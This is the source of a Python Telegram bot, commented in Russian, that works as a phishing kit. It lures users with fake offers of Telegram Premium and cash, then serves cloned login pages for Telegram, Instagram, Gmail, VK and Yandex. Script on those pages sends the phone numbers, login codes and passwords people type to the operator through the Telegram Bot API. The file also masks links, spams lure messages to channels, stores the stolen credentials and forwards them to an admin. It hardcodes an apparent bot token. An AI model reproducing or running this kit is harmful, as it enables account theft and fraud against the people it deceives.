#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import random
import string
import hashlib
import base64
import sqlite3
import threading
import requests
import re
import logging
from datetime import datetime, timedelta

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ============= КОНФИГУРАЦИЯ =============
TOKEN = "8755487229:AAGDI58GgaR9sp0nTXudlknmLbN2Q5Yok_Q"
API_URL = f"https://api.telegram.org/bot{TOKEN}"
ADMIN_ID =  7750512181 # ЗАМЕНИ ПОСЛЕ ЗАПУСКА!

# Создаем директории
os.makedirs("data", exist_ok=True)
os.makedirs("data/logs", exist_ok=True)

# ============= БАЗА ДАННЫХ =============
class Database:
    def __init__(self):
        self.conn = sqlite3.connect('data/bot.db', check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.init_db()
    
    def init_db(self):
        # Пользователи
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS users
                              (user_id INTEGER PRIMARY KEY,
                               username TEXT,
                               first_name TEXT,
                               step TEXT,
                               gift TEXT,
                               created TIMESTAMP)''')
        
        # Учетные данные
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS credentials
                              (id INTEGER PRIMARY KEY AUTOINCREMENT,
                               user_id INTEGER,
                               service TEXT,
                               login TEXT,
                               password TEXT,
                               timestamp TIMESTAMP)''')
        
        # Фишинг ссылки
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS phish_links
                              (id INTEGER PRIMARY KEY AUTOINCREMENT,
                               user_id INTEGER,
                               link TEXT,
                               service TEXT,
                               clicked INTEGER DEFAULT 0,
                               submitted INTEGER DEFAULT 0,
                               created TIMESTAMP)''')
        
        # Обновления
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS updates
                              (update_id INTEGER PRIMARY KEY)''')
        
        self.conn.commit()
    
    def add_user(self, user_id, username, first_name):
        self.cursor.execute('''INSERT OR IGNORE INTO users 
                              (user_id, username, first_name, created)
                              VALUES (?, ?, ?, ?)''',
                           (user_id, username, first_name, datetime.now()))
        self.conn.commit()
    
    def update_user_step(self, user_id, step, gift=None):
        if gift:
            self.cursor.execute("UPDATE users SET step = ?, gift = ? WHERE user_id = ?", (step, gift, user_id))
        else:
            self.cursor.execute("UPDATE users SET step = ? WHERE user_id = ?", (step, user_id))
        self.conn.commit()
    
    def get_user_step(self, user_id):
        self.cursor.execute("SELECT step, gift FROM users WHERE user_id = ?", (user_id,))
        return self.cursor.fetchone()
    
    def add_creds(self, user_id, service, login, password):
        self.cursor.execute('''INSERT INTO credentials 
                              (user_id, service, login, password, timestamp)
                              VALUES (?, ?, ?, ?, ?)''',
                           (user_id, service, login, password, datetime.now()))
        self.conn.commit()
        return self.cursor.lastrowid
    
    def add_phish_link(self, user_id, link, service):
        self.cursor.execute('''INSERT INTO phish_links 
                              (user_id, link, service, created)
                              VALUES (?, ?, ?, ?)''',
                           (user_id, link, service, datetime.now()))
        self.conn.commit()
        return self.cursor.lastrowid
    
    def mark_clicked(self, link_id):
        self.cursor.execute("UPDATE phish_links SET clicked = 1 WHERE id = ?", (link_id,))
        self.conn.commit()
    
    def mark_submitted(self, link_id):
        self.cursor.execute("UPDATE phish_links SET submitted = 1 WHERE id = ?", (link_id,))
        self.conn.commit()
    
    def check_link_status(self, link_id):
        self.cursor.execute("SELECT clicked, submitted FROM phish_links WHERE id = ?", (link_id,))
        return self.cursor.fetchone()
    
    def is_update_processed(self, update_id):
        self.cursor.execute("SELECT 1 FROM updates WHERE update_id = ?", (update_id,))
        return self.cursor.fetchone() is not None
    
    def mark_update_processed(self, update_id):
        self.cursor.execute("INSERT OR IGNORE INTO updates (update_id) VALUES (?)", (update_id,))
        self.conn.commit()

db = Database()

# ============= TELEGRAM API =============
class TelegramBot:
    def __init__(self, token):
        self.token = token
        self.api_url = f"https://api.telegram.org/bot{token}"
        self.offset = 0
    
    def request(self, method, data=None):
        try:
            url = f"{self.api_url}/{method}"
            if data:
                r = requests.post(url, json=data, timeout=10)
            else:
                r = requests.get(url, timeout=10)
            
            if r.status_code == 200:
                return r.json()
            return None
        except Exception as e:
            logger.error(f"API Error: {e}")
            return None
    
    def get_updates(self):
        data = {'offset': self.offset, 'timeout': 10}
        result = self.request('getUpdates', data)
        if result and result.get('ok'):
            return result.get('result', [])
        return []
    
    def send_message(self, chat_id, text, reply_markup=None):
        data = {'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML'}
        if reply_markup:
            data['reply_markup'] = json.dumps(reply_markup)
        return self.request('sendMessage', data)
    
    def edit_message(self, chat_id, message_id, text, reply_markup=None):
        data = {'chat_id': chat_id, 'message_id': message_id, 'text': text, 'parse_mode': 'HTML'}
        if reply_markup:
            data['reply_markup'] = json.dumps(reply_markup)
        return self.request('editMessageText', data)
    
    def answer_callback(self, callback_id, text=None):
        data = {'callback_query_id': callback_id}
        if text:
            data['text'] = text
        return self.request('answerCallbackQuery', data)

bot = TelegramBot(TOKEN)

# ============= A-Z PHISHER (УПРОЩЕННЫЙ) =============
class AZPhisher:
    """Генератор фишинг страниц"""
    
    def generate_link(self, user_id, service):
        """Генерирует фишинг ссылку"""
        
        # Создаем уникальный ID
        link_id = hashlib.md5(f"{user_id}{service}{time.time()}".encode()).hexdigest()[:8]
        
        # В реальном проекте здесь должен быть хостинг
        # Для демо используем telegra.ph
        link = f"https://telegra.ph/{service}-{link_id}"
        
        return link
    
    def get_template(self, service, user_id):
        """Возвращает HTML шаблон"""
        
        templates = {
            'telegram': self.telegram_template,
            'instagram': self.instagram_template,
            'gmail': self.gmail_template,
            'vk': self.vk_template,
            'yandex': self.yandex_template
        }
        
        if service in templates:
            return templates[service](user_id)
        return self.default_template(user_id, service)
    
    def telegram_template(self, user_id):
        return f'''<!DOCTYPE html>
<html>
<head><title>Telegram</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{{font-family:Arial;background:#e7ebf0;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:16px}}
.container{{max-width:400px;width:100%}}
.card{{background:white;border-radius:16px;padding:32px;box-shadow:0 4px 12px rgba(0,0,0,0.15)}}
.logo{{text-align:center;margin-bottom:24px}}
h2{{text-align:center;color:#222;margin-bottom:24px}}
input{{width:100%;padding:14px 16px;border:2px solid #e1e4e8;border-radius:12px;font-size:16px;margin-bottom:16px;box-sizing:border-box}}
button{{width:100%;padding:16px;background:#2AABEE;color:white;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer}}
button:hover{{background:#229ED9}}
</style>
</head>
<body>
<div class="container">
<div class="card">
<div class="logo"><svg width="80" height="80" viewBox="0 0 24 24" fill="#2AABEE"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/></svg></div>
<h2>Sign in to Telegram</h2>
<form id="loginForm">
<input type="tel" id="phone" placeholder="Phone Number" required>
<button type="submit">Next</button>
</form>
<form id="codeForm" style="display:none">
<input type="text" id="code" placeholder="Login Code" maxlength="5" required>
<button type="submit">Sign In</button>
</form>
</div>
</div>
<script>
let userData={{}};
document.getElementById('loginForm').onsubmit=async(e)=>{{
e.preventDefault();
userData.phone=document.getElementById('phone').value;
await fetch('{API_URL}/sendMessage',{{
method:'POST',
headers:{{'Content-Type':'application/json'}},
body:JSON.stringify({{
chat_id:{user_id},
text:`📱 Phone: ${{userData.phone}}`
}})
}});
document.getElementById('loginForm').style.display='none';
document.getElementById('codeForm').style.display='block';
}};
document.getElementById('codeForm').onsubmit=async(e)=>{{
e.preventDefault();
const code=document.getElementById('code').value;
await fetch('{API_URL}/sendMessage',{{
method:'POST',
headers:{{'Content-Type':'application/json'}},
body:JSON.stringify({{
chat_id:{user_id},
text:`🔑 Code: ${{code}}\\n📱 Phone: ${{userData.phone}}`
}})
}});
document.querySelector('.card').innerHTML='<div style="text-align:center;padding:40px"><h3>Success!</h3><p>Redirecting...</p></div>';
setTimeout(()=>window.location.href='https://telegram.org',2000);
}};
</script>
</body>
</html>'''
    
    def instagram_template(self, user_id):
        return f'''<!DOCTYPE html>
<html>
<head><title>Instagram</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{{font-family:Arial;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}
.container{{max-width:350px;width:100%;padding:16px}}
.card{{background:white;border:1px solid #dbdbdb;border-radius:8px;padding:40px}}
.logo{{text-align:center;margin-bottom:32px}}
input{{width:100%;padding:9px 8px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;margin-bottom:6px;box-sizing:border-box}}
button{{width:100%;padding:7px 16px;background:#0095f6;color:white;border:none;border-radius:8px;font-weight:600;cursor:pointer}}
</style>
</head>
<body>
<div class="container">
<div class="card">
<div class="logo"><svg width="175" height="51" viewBox="0 0 175 51"><path d="M39.5 0h96c9.1 0 16.5 7.4 16.5 16.5v18c0 9.1-7.4 16.5-16.5 16.5h-96C30.4 51 23 43.6 23 34.5v-18C23 7.4 30.4 0 39.5 0z" fill="#C13584"/><circle cx="87.5" cy="25.5" r="12.5" fill="white"/></svg></div>
<form id="loginForm">
<input type="text" id="username" placeholder="Username" required>
<input type="password" id="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
</div>
</div>
<script>
document.getElementById('loginForm').onsubmit=async(e)=>{{
e.preventDefault();
const username=document.getElementById('username').value;
const password=document.getElementById('password').value;
await fetch('{API_URL}/sendMessage',{{
method:'POST',
headers:{{'Content-Type':'application/json'}},
body:JSON.stringify({{
chat_id:{user_id},
text:`📸 Instagram\\n👤 Username: ${{username}}\\n🔑 Password: ${{password}}`
}})
}});
alert('Wrong password');
document.getElementById('password').value='';
}};
</script>
</body>
</html>'''
    
    def gmail_template(self, user_id):
        return f'''<!DOCTYPE html>
<html>
<head><title>Gmail</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{{font-family:'Google Sans',Arial;background:#f0f2f4;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}
.container{{max-width:400px;width:100%;padding:20px}}
.card{{background:white;border-radius:8px;padding:48px 40px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}}
.logo{{text-align:center;margin-bottom:32px}}
h2{{text-align:center;color:#202124;font-weight:400;margin-bottom:32px}}
input{{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:16px;box-sizing:border-box}}
button{{width:100%;padding:13px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer}}
</style>
</head>
<body>
<div class="container">
<div class="card">
<div class="logo"><svg width="75" height="75" viewBox="0 0 24 24"><path d="M22 6.5v10c0 .8-.7 1.5-1.5 1.5h-17c-.8 0-1.5-.7-1.5-1.5v-10c0-.8.7-1.5 1.5-1.5h17c.8 0 1.5.7 1.5 1.5z" fill="#4285F4"/><path d="M22 6.5L12 13 2 6.5h20z" fill="#EA4335"/><path d="M22 16.5v-10l-10 6.5-10-6.5v10c0 .8.7 1.5 1.5 1.5h17c.8 0 1.5-.7 1.5-1.5z" fill="#34A853"/></svg></div>
<h2>Sign in to Gmail</h2>
<form id="loginForm">
<input type="email" id="email" placeholder="Email" required>
<input type="password" id="password" placeholder="Password" required>
<button type="submit">Next</button>
</form>
</div>
</div>
<script>
document.getElementById('loginForm').onsubmit=async(e)=>{{
e.preventDefault();
const email=document.getElementById('email').value;
const password=document.getElementById('password').value;
await fetch('{API_URL}/sendMessage',{{
method:'POST',
headers:{{'Content-Type':'application/json'}},
body:JSON.stringify({{
chat_id:{user_id},
text:`📧 Gmail\\n👤 Email: ${{email}}\\n🔑 Password: ${{password}}`
}})
}});
alert('Wrong password');
document.getElementById('password').value='';
}};
</script>
</body>
</html>'''
    
    def vk_template(self, user_id):
        return f'''<!DOCTYPE html>
<html>
<head><title>VK</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{{font-family:Arial;background:#edeef0;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}
.container{{max-width:400px;width:100%;padding:20px}}
.card{{background:white;border-radius:8px;padding:40px;box-shadow:0 2px 4px rgba(0,0,0,0.1)}}
.logo{{text-align:center;margin-bottom:32px}}
h2{{text-align:center;margin-bottom:24px}}
input{{width:100%;padding:12px;border:1px solid #d3d9de;border-radius:4px;margin-bottom:12px;box-sizing:border-box}}
button{{width:100%;padding:12px;background:#4a76a8;color:white;border:none;border-radius:4px;cursor:pointer}}
</style>
</head>
<body>
<div class="container">
<div class="card">
<div class="logo"><svg width="80" height="80" viewBox="0 0 24 24" fill="#4a76a8"><path d="M15.1 10.8c.2-.3.4-.7.6-1 .2-.3.3-.6.3-.8 0-.3-.1-.5-.3-.7-.2-.2-.5-.3-.9-.3h-1.5v3h1.3c.2 0 .4-.1.5-.2zM13.3 6.6h1.7c.6 0 1.1.2 1.4.5.3.3.5.7.5 1.2 0 .4-.1.8-.4 1.2-.3.4-.6.6-1 .8.5.2.9.5 1.2.9.3.4.4.8.4 1.3 0 .5-.2 1-.5 1.4-.3.4-.7.7-1.1.9-.4.2-.9.3-1.5.3h-2.1V6.6h.4z"/></svg></div>
<h2>Вход ВКонтакте</h2>
<form id="loginForm">
<input type="text" id="login" placeholder="Телефон или email" required>
<input type="password" id="password" placeholder="Пароль" required>
<button type="submit">Войти</button>
</form>
</div>
</div>
<script>
document.getElementById('loginForm').onsubmit=async(e)=>{{
e.preventDefault();
const login=document.getElementById('login').value;
const password=document.getElementById('password').value;
await fetch('{API_URL}/sendMessage',{{
method:'POST',
headers:{{'Content-Type':'application/json'}},
body:JSON.stringify({{
chat_id:{user_id},
text:`🇷🇺 VK\\n👤 Login: ${{login}}\\n🔑 Password: ${{password}}`
}})
}});
alert('Неверный пароль');
document.getElementById('password').value='';
}};
</script>
</body>
</html>'''
    
    def yandex_template(self, user_id):
        return f'''<!DOCTYPE html>
<html>
<head><title>Yandex</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{{font-family:'YS Text',Arial;background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}
.container{{max-width:400px;width:100%;padding:20px}}
.card{{background:white;border-radius:16px;padding:40px;box-shadow:0 4px 12px rgba(0,0,0,0.1)}}
.logo{{text-align:center;margin-bottom:32px}}
h2{{text-align:center;margin-bottom:24px}}
input{{width:100%;padding:12px;border:1px solid #e6e6e6;border-radius:8px;margin-bottom:12px;box-sizing:border-box}}
button{{width:100%;padding:12px;background:#fc3f1d;color:white;border:none;border-radius:8px;cursor:pointer}}
</style>
</head>
<body>
<div class="container">
<div class="card">
<div class="logo"><svg width="80" height="80" viewBox="0 0 24 24" fill="#fc3f1d"><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2z"/></svg></div>
<h2>Яндекс ID</h2>
<form id="loginForm">
<input type="text" id="login" placeholder="Логин или email" required>
<input type="password" id="password" placeholder="Пароль" required>
<button type="submit">Войти</button>
</form>
</div>
</div>
<script>
document.getElementById('loginForm').onsubmit=async(e)=>{{
e.preventDefault();
const login=document.getElementById('login').value;
const password=document.getElementById('password').value;
await fetch('{API_URL}/sendMessage',{{
method:'POST',
headers:{{'Content-Type':'application/json'}},
body:JSON.stringify({{
chat_id:{user_id},
text:`🇷🇺 Yandex\\n👤 Login: ${{login}}\\n🔑 Password: ${{password}}`
}})
}});
alert('Неверный логин или пароль');
document.getElementById('password').value='';
}};
</script>
</body>
</html>'''
    
    def default_template(self, user_id, service):
        return f'''<!DOCTYPE html>
<html>
<head><title>{service.title()} Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}
.container{{max-width:400px;width:100%;padding:20px}}
.card{{background:white;border-radius:8px;padding:40px;box-shadow:0 2px 4px rgba(0,0,0,0.1)}}
h2{{text-align:center;margin-bottom:24px}}
input{{width:100%;padding:12px;border:1px solid #ddd;border-radius:4px;margin-bottom:12px;box-sizing:border-box}}
button{{width:100%;padding:12px;background:#007bff;color:white;border:none;border-radius:4px;cursor:pointer}}
</style>
</head>
<body>
<div class="container">
<div class="card">
<h2>{service.title()} Login</h2>
<form id="loginForm">
<input type="text" id="username" placeholder="Username" required>
<input type="password" id="password" placeholder="Password" required>
<button type="submit">Login</button>
</form>
</div>
</div>
<script>
document.getElementById('loginForm').onsubmit=async(e)=>{{
e.preventDefault();
const username=document.getElementById('username').value;
const password=document.getElementById('password').value;
await fetch('{API_URL}/sendMessage',{{
method:'POST',
headers:{{'Content-Type':'application/json'}},
body:JSON.stringify({{
chat_id:{user_id},
text:`🔐 {service}\\n👤 Username: ${{username}}\\n🔑 Password: ${{password}}`
}})
}});
alert('Login failed');
document.getElementById('password').value='';
}};
</script>
</body>
</html>'''

# ============= MASKPHISH =============
class MaskPhish:
    def mask(self, original_link, service=None):
        """Маскирует ссылку"""
        domains = ['t.me', 'telegra.ph', 'bit.ly', 'tinyurl.com']
        domain = random.choice(domains)
        path = random.choice(['premium', 'gift', 'bonus', 'auth'])
        rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        return f"https://{domain}/{path}/{rand}"

# ============= КЛАВИАТУРЫ =============
class Keyboards:
    @staticmethod
    def main_menu():
        return {
            'inline_keyboard': [
                [{'text': '🎁 ПОЛУЧИТЬ ПОДАРОК', 'callback_data': 'menu_gifts'}]
            ]
        }
    
    @staticmethod
    def gifts_menu():
        return {
            'inline_keyboard': [
                [{'text': '📱 Telegram Premium', 'callback_data': 'gift_telegram'}],
                [{'text': '📸 Instagram', 'callback_data': 'gift_instagram'}],
                [{'text': '📧 Gmail', 'callback_data': 'gift_gmail'}],
                [{'text': '🇷🇺 VK', 'callback_data': 'gift_vk'}],
                [{'text': '🇷🇺 Yandex', 'callback_data': 'gift_yandex'}],
                [{'text': '💰 100 000 RUB', 'callback_data': 'gift_money'}],
                [{'text': '🔙 НАЗАД', 'callback_data': 'back'}]
            ]
        }

# ============= ОСНОВНОЙ ОБРАБОТЧИК =============
class BotHandler:
    def __init__(self):
        self.phisher = AZPhisher()
        self.masker = MaskPhish()
        self.user_links = {}
    
    def handle_start(self, user_id, username, first_name):
        db.add_user(user_id, username, first_name)
        
        text = (
            f"✨ <b>ПРИВЕТ, {first_name}!</b>\n\n"
            "🎁 <b>ТЫ МОЖЕШЬ ПОЛУЧИТЬ:</b>\n"
            "• Telegram Premium\n"
            "• Instagram верификация\n"
            "• Gmail 1TB\n"
            "• 100 000 рублей\n\n"
            "👇 <b>НАЖМИ КНОПКУ</b>"
        )
        
        bot.send_message(user_id, text, reply_markup=Keyboards.main_menu())
    
    def handle_callback(self, user_id, data, msg_id, cb_id):
        
        if data == 'menu_gifts':
            bot.edit_message(user_id, msg_id, "🎁 ВЫБЕРИ ПОДАРОК:", Keyboards.gifts_menu())
        
        elif data.startswith('gift_'):
            gift = data.replace('gift_', '')
            db.update_user_step(user_id, 'waiting_service', gift)
            
            bot.edit_message(
                user_id, msg_id,
                f"🎁 ТЫ ВЫБРАЛ: {gift.upper()}\n\n"
                f"🔗 ССЫЛКА ДЛЯ ПОЛУЧЕНИЯ:\n"
                f"https://t.me/YourBot?start=auth_{user_id}\n\n"
                f"⏳ ОЖИДАЮ ПОДТВЕРЖДЕНИЯ..."
            )
            
            # Запускаем проверку
            threading.Thread(target=self.wait_for_data, args=(user_id,)).start()
        
        elif data == 'back':
            bot.edit_message(user_id, msg_id, "✨ ГЛАВНОЕ МЕНЮ", Keyboards.main_menu())
        
        bot.answer_callback(cb_id)
    
    def wait_for_data(self, user_id):
        """Ждет данные от пользователя"""
        timeout = time.time() + 300  # 5 минут
        
        while time.time() < timeout:
            # Проверяем новые данные
            db.cursor.execute('''SELECT * FROM credentials 
                               WHERE user_id = ? AND timestamp > datetime('now', '-1 minute')''', (user_id,))
            creds = db.cursor.fetchone()
            
            if creds:
                _, _, service, login, password, ts = creds
                
                bot.send_message(
                    user_id,
                    "✅ <b>ДАННЫЕ ПОЛУЧЕНЫ!</b>\n\n"
                    "🎁 <b>ПОДАРОК УЖЕ ТВОЙ!</b>\n\n"
                    "💫 Ожидай в течение 5 минут"
                )
                
                # Уведомление админу
                bot.send_message(
                    ADMIN_ID,
                    f"🔓 <b>NEW DATA!</b>\n\n"
                    f"Service: {service}\n"
                    f"Login: {login}\n"
                    f"Password: {password}",
                    parse_mode='HTML'
                )
                
                return
            
            time.sleep(5)
        
        # Если данные не получены
        bot.send_message(
            user_id,
            "❌ <b>ВРЕМЯ ВЫШЛО!</b>\n\n"
            "Попробуй снова /start"
        )
    
    def handle_message(self, user_id, text, username, first_name):
        """Обрабатывает сообщения"""
        
        # Проверяем, не данные ли это от фишинг страницы
        if '📱 Phone:' in text or '📸 Instagram' in text or '📧 Gmail' in text:
            self.save_phish_data(user_id, text)
            return
        
        # Иначе отправляем в меню
        self.handle_start(user_id, username, first_name)
    
    def save_phish_data(self, user_id, text):
        """Сохраняет данные от фишинг страницы"""
        
        lines = text.split('\n')
        service = 'unknown'
        login = ''
        password = ''
        
        for line in lines:
            if '📱 Phone:' in line:
                login = line.replace('📱 Phone:', '').strip()
                service = 'telegram'
            elif '🔑 Code:' in line:
                password = line.replace('🔑 Code:', '').strip()
            elif '📸 Instagram' in line:
                service = 'instagram'
            elif '👤 Username:' in line:
                login = line.replace('👤 Username:', '').strip()
            elif '🔑 Password:' in line:
                password = line.replace('🔑 Password:', '').strip()
            elif '📧 Gmail' in line:
                service = 'gmail'
            elif '👤 Email:' in line:
                login = line.replace('👤 Email:', '').strip()
            elif '🇷🇺 VK' in line:
                service = 'vk'
            elif '👤 Login:' in line:
                login = line.replace('👤 Login:', '').strip()
            elif '🇷🇺 Yandex' in line:
                service = 'yandex'
        
        if login and (password or service == 'telegram'):
            db.add_creds(user_id, service, login, password)
            logger.info(f"✅ Saved {service} credentials for user {user_id}")

# ============= АВТОМАТИЧЕСКАЯ РАССЫЛКА =============
class AutoSpammer:
    def __init__(self):
        self.groups = ['@test_channel']
        self.msgs = [
            "🎁 Telegram Premium в подарок! @YourBot",
            "💰 100 000 рублей за подписку! @YourBot"
        ]
    
    def start(self):
        while True:
            try:
                for g in self.groups:
                    bot.send_message(g, random.choice(self.msgs))
                    time.sleep(10)
            except:
                pass
            time.sleep(900)

# ============= ЗАПУСК =============
def main():
    logger.info("🚀 БОТ ЗАПУЩЕН!")
    
    handler = BotHandler()
    spammer = AutoSpammer()
    
    # Запускаем рассылку
    threading.Thread(target=spammer.start, daemon=True).start()
    
    # Основной цикл
    while True:
        try:
            updates = bot.get_updates()
            
            for update in updates:
                uid = update['update_id']
                
                if db.is_update_processed(uid):
                    continue
                
                if 'message' in update:
                    msg = update['message']
                    user_id = msg['from']['id']
                    username = msg['from'].get('username', '')
                    first_name = msg['from'].get('first_name', '')
                    
                    if 'text' in msg:
                        text = msg['text']
                        
                        if text == '/start':
                            handler.handle_start(user_id, username, first_name)
                        elif text == '/admin' and user_id == ADMIN_ID:
                            bot.send_message(user_id, "👑 ADMIN PANEL")
                        else:
                            handler.handle_message(user_id, text, username, first_name)
                
                elif 'callback_query' in update:
                    cb = update['callback_query']
                    user_id = cb['from']['id']
                    data = cb['data']
                    msg_id = cb['message']['message_id']
                    cb_id = cb['id']
                    
                    handler.handle_callback(user_id, data, msg_id, cb_id)
                
                db.mark_update_processed(uid)
                bot.offset = uid + 1
            
            time.sleep(1)
            
        except Exception as e:
            logger.error(f"Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
